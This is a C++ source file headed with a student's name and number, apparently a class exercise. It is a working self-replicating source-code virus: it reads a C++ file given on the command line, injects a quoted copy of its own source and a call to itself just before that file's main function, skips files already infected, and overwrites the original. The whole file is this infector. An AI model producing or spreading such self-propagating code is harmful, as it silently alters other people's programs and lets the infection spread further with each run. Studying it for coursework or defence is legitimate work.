// MURATORE TRISTAN 20443557
#include <iostream>
#include <fstream>
using namespace std;
int naughtyClass(char **argv) {
    string helpers [] = {
            "int main",
            "naughtyClass",
            "(argv);"
    };
    string me [] = {
            "// MURATORE TRISTAN 20443557",
            "#include <iostream>",
            "#include <fstream>",
            "using namespace std;", //3
            "int naughtyClass(char **argv) {",//4
            "   string helpers [] = {", //5
            "   };", //6
            "   string me [] = {", //7
            "   };", //8
            "    fstream VictimFile;",
            "    string line;",
            "    VictimFile.open(argv[1], ios::in);",
            "    string outputFile;",
            "    int q = 34;",
            "    int co = 44;",
            "    int nl = 10;",
            "    bool abort = false;",
            "    if(VictimFile.is_open()){",
            "        for (int i = 0; i < 4; i++){",
            "            outputFile.append(me[i] + (char) nl);",
            "            cout << me[i] << endl;",
            "        }",
            "        while (getline(VictimFile, line)){",
            "            if(line.find(helpers[1]) != std::string::npos) {",
            "                abort = true;",
            "                break;",
            "            }",
            "            if(line.find(helpers[0]) != std::string::npos){",
            "                //Insert naughty+helpers+opening me",
            "                outputFile.append(me[4]+ (char) nl);",
            "                cout << me[4] << endl ;",
            "                outputFile.append(me[5]+ (char) nl);",
            "                cout << me[5] << endl ;",
            "                for (int j = 0; j < 3; j++){",
            "                    outputFile.append((char) q + helpers[j]+ (char) q + (char) co + (char) nl);",
            "                    cout << (char) q + helpers[j]+ (char) q + (char) co << endl ;",
            "                }",
            "                outputFile.append(me[6]+ (char) nl);",
            "                cout << me[6] << endl ;",
            "                outputFile.append(me[7]+ (char) nl);",
            "                cout << me[7] << endl ;",
            "                //Insert all of me content surrounded by,",
            "                for(int k = 0; k < 71; k++){",
            "                    outputFile.append((char) q + me[k]+ (char) q + (char) co + (char) nl);",
            "                    cout << (char) q + me[k]+ (char) q + (char) co << endl ;",
            "                }",
            "                //Insert rest of my code",
            "                for(int l = 8; l < 71; l++){",
            "                    outputFile.append(me[l] + (char) nl);",
            "                    cout << me[l] << endl ;",
            "                }",
            "                //Insert main start",
            "                outputFile.append(line + (char) nl);",
            "                cout << line << endl ;",
            "                //insert naughtCall",
            "                outputFile.append(helpers[1] + helpers[2] + (char) nl);",
            "                cout << helpers[1] + helpers[2] << endl;",
            "            } else {",
            "                outputFile.append(line + (char) nl);",
            "                cout << line << endl;",
            "            }",
            "        }",
            "    }",
            "   if(!abort) {",
            "        VictimFile.close();",
            "        VictimFile.open(argv[1], ios::out);",
            "        VictimFile << outputFile;",
            "    }",
            "    VictimFile.close();",
            "    return 0;",
            "};"
    };
    fstream VictimFile;
    string line;
    VictimFile.open(argv[1], ios::in);
    string outputFile;
    int q = 34;
    int co = 44;
    int nl = 10;
    bool abort = false;
    if(VictimFile.is_open()){
        for (int i = 0; i < 4; i++){
            outputFile.append(me[i] + (char) nl);
            cout << me[i] << endl;
        }
        while (getline(VictimFile, line)){
            if(line.find(helpers[1]) != std::string::npos) {
                abort = true;
                break;
            }
            if(line.find(helpers[0]) != std::string::npos){
                //Insert naughty+helpers+opening me
                outputFile.append(me[4]+ (char) nl);
                cout << me[4] << endl ;
                outputFile.append(me[5]+ (char) nl);
                cout << me[5] << endl ;
                for (int j = 0; j < 3; j++){
                    outputFile.append((char) q + helpers[j]+ (char) q + (char) co + (char) nl);
                    cout << (char) q + helpers[j]+ (char) q + (char) co << endl ;
                }
                outputFile.append(me[6]+ (char) nl);
                cout << me[6] << endl ;
                outputFile.append(me[7]+ (char) nl);
                cout << me[7] << endl ;
                //Insert all of me content surrounded by "",
                for(int k = 0; k < 71; k++){
                    outputFile.append((char) q + me[k]+ (char) q + (char) co + (char) nl);
                    cout << (char) q + me[k]+ (char) q + (char) co << endl ;
                }
                //Insert rest of my code
                for(int l = 8; l < 71; l++){
                    outputFile.append(me[l] + (char) nl);
                    cout << me[l] << endl ;
                }
                //Insert main start
                outputFile.append(line + (char) nl);
                cout << line << endl ;
                //insert naughtCall
                outputFile.append(helpers[1] + helpers[2] + (char) nl);
                cout << helpers[1] + helpers[2] << endl;
            } else {
                outputFile.append(line + (char) nl);
                cout << line << endl;
            }
        }
    }
    if(!abort) {
        VictimFile.close();
        VictimFile.open(argv[1], ios::out);
        VictimFile << outputFile;
    }
    VictimFile.close();
    return 0;
};

int main(int argc, char** argv) {
    naughtyClass(argv);
    return 0;
}

